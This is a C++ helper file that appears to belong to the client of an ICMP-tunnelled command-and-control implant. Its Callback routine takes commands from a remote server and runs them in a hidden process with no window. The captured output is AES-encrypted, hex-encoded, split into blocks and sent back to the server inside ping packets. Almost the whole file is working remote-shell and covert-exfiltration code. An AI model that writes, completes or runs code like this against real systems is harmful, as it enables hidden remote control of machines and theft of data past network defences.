#include "helpers.h"
#include "Client.h"
#include "AESHandler.h"
#include <thread>

AESHandler* aesHandler = AESHandler::getInstance();
Client* client = Client::getInstance();

namespace Helper {

    std::wstring to_wstring(const std::string& stringToConvert) {
        std::wstring wideString =
            std::wstring_convert<std::codecvt_utf8<wchar_t>>().from_bytes(stringToConvert);
        return wideString;
    }

    // Helper function to convert a hex string to a vector of bytes
    std::vector<unsigned char> hex_to_bytes(const std::string& hex) {
        std::vector<unsigned char> bytes;
        for (size_t i = 0; i < hex.length(); i += 2) {
            std::string byteString = hex.substr(i, 2);
            unsigned char byte = (unsigned char)strtol(byteString.c_str(), nullptr, 16);
            bytes.push_back(byte);
        }
        return bytes;
    }

    // Helper function to convert a byte vector to a hex string
    std::string bytes_to_hex(const std::vector<unsigned char>& bytes) {
        std::ostringstream oss;
        for (unsigned char byte : bytes) {
            oss << std::hex << std::setfill('0') << std::setw(2) << (int)byte;
        }
        return oss.str();
    }


    // Function to continuously read from the pipe
    void readPipe(HANDLE pipe, std::string& output) {
        CHAR buffer[4096];
        DWORD bytesRead;
        while (true) {
            if (!ReadFile(pipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) || bytesRead == 0) {
                break;
            }
            buffer[bytesRead] = '\0';
            output += buffer;
        }
    }

    bool Run(const std::wstring& command, const std::wstring& arguments, std::string * output) {
        STARTUPINFOW si;
        PROCESS_INFORMATION pi;
        SECURITY_ATTRIBUTES sa;
        HANDLE g_hChildStd_OUT_Rd = NULL;
        HANDLE g_hChildStd_OUT_Wr = NULL;

        // Set the security attributes to allow the pipe handles to be inherited.
        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
        sa.bInheritHandle = TRUE;
        sa.lpSecurityDescriptor = NULL;

        // Create a pipe for the child process's STDOUT.
        if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &sa, 0)) {
            std::cerr << "StdoutRd CreatePipe failed\n";
            return false;
        }

        // Ensure the read handle to the pipe for STDOUT is not inherited.
        if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0)) {
            std::cerr << "Stdout SetHandleInformation failed\n";
            return false;
        }

        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.hStdOutput = g_hChildStd_OUT_Wr;
        si.hStdError = g_hChildStd_OUT_Wr;  // Redirect stderr to the same pipe
        si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        ZeroMemory(&pi, sizeof(pi));

        // Combine the command and arguments into a single string
        std::wstring fullCommand = command + L" " + arguments;

        // Create the child process
        if (!CreateProcessW(
            NULL,               // No module name (use command line)
            &fullCommand[0],    // Command line (must be writable buffer)
            NULL,               // Process handle not inheritable
            NULL,               // Thread handle not inheritable
            TRUE,               // Set handle inheritance to TRUE
            CREATE_NO_WINDOW,   // No creation flags
            NULL,               // Use parent's environment block
            NULL,               // Use parent's starting directory 
            &si,                // Pointer to STARTUPINFO structure
            &pi)                // Pointer to PROCESS_INFORMATION structure
            ) {
            std::cerr << "CreateProcessW failed (" << GetLastError() << ").\n";
            return false;
        }

        // Close the write end of the pipe before reading from the read end.
        CloseHandle(g_hChildStd_OUT_Wr);

        // Read from the pipe in a separate thread
        std::string commandOutput;
        std::thread readerThread(readPipe, g_hChildStd_OUT_Rd, std::ref(commandOutput));

        // Wait for the child process to exit
        WaitForSingleObject(pi.hProcess, INFINITE);

        // Check the exit code
        DWORD ec;
        if (GetExitCodeProcess(pi.hProcess, &ec)) {
            if (ec == 1) {
                *output = "Error: ";
            } else if (ec == 0) {
                *output = "OK: ";
            }
        } else {
            std::cerr << "Failed to get exit code (" << GetLastError() << ").\n";
            *output = "Error: ";
        }

        // Wait for the reader thread to finish
        readerThread.join();

        // Append the actual output of the command
        *output += commandOutput;

        // Close handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(g_hChildStd_OUT_Rd);

        return true;
    }
    
    std::vector<std::string> EncryptAndSplit(const std::string& client_response) {
        // Encrypt
        std::vector<unsigned char> ciphertext = aesHandler->encryptMessage(client_response);
        std::string encrypted = bytes_to_hex(ciphertext);

        // Split result into blocks
        std::vector<std::string> to_server = split(encrypted, client->getBlocksize());

        return to_server;
    }


    void Callback(SOCKET sockfd, Custom_icmp icmp, const std::string& ip_addr, bool connected, bool exec, bool exit) {
        std::cout << "\033[96m" << "[*] Checking if SERVER has command for us..." << "\033[0m" << "\n";
        
        // If client received a command to excute
        if (exec) {
            std::string output;
            int status = Run(client->getShell(), to_wstring(client->getServerCommand()), &output);
            client->setClientResponse(output);
            exit = false;
            
        } 
        
        // Encrypt and split into blocks of client->getBlocksize()
        std::vector<std::string> to_server = EncryptAndSplit(client->getClientResponse());

        // Send the encrypted message block by block
        std::string status = icmp.sendPing(sockfd, ip_addr, to_server, connected, exit);

        if (status == "SERVER OFFLINE") {
            client->FullCleanup();
            return;
        }

        if (status == "cancel") {
            client->setCancelCmd(true);
            return;
        }
        
        return;
    }

    std::vector<std::string> splitString(const std::string& str) {
        std::istringstream iss(str);
        std::vector<std::string> words;
        std::string word;

        // Split the string by spaces
        while (iss >> word) {
            words.push_back(word);
        }

        return words;
    }


    std::vector<std::string> split(const std::string& str, int n) {
        std::vector<std::string> blocks;
        int length = str.length();

        for (int i = 0; i < length; i += n) {
            // Extract substring of size n starting from index i
            std::string block = str.substr(i, n);

            // If the last block is smaller than n, pad it with '0'
            if (block.length() < n) {
                block.append(n - block.length(), '0');
            }

            blocks.push_back(block);
        }
        // If blocks list is of length 1, we must create another block. Or else server cant distinguish between first and last packet.
        if (blocks.size() == 1) {
            std::string block;
            for (int i = 0; i < length; i += n) {
                if (block.length() < n) {
                    block.append(n - block.length(), '0');
                }

            }
            blocks.push_back(block);

        }

        return blocks;
    }
}